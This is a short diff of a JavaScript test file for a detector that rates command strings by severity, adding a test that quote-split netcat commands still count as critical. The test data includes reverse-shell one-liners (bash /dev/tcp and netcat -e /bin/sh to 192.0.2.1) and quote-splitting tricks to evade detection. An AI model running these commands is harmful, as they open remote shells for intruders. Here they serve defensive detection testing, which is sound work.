@@ -45,3 +45,8 @@ test("network tools without a shell are not a match", () => {
 test("a comment drops one level", () => {
   expect(severity("# bash -i >& /dev/tcp/192.0.2.1/1234 0>&1")).toBe("warn");
 });
+
+test("split quoting does not hide a command", () => {
+  expect(severity("n'c' -e /bin/sh 192.0.2.1 1234")).toBe("critical");
+  expect(severity(`"nc"at 192.0.2.1 1234 -c /bin/bash`)).toBe("critical");
+});
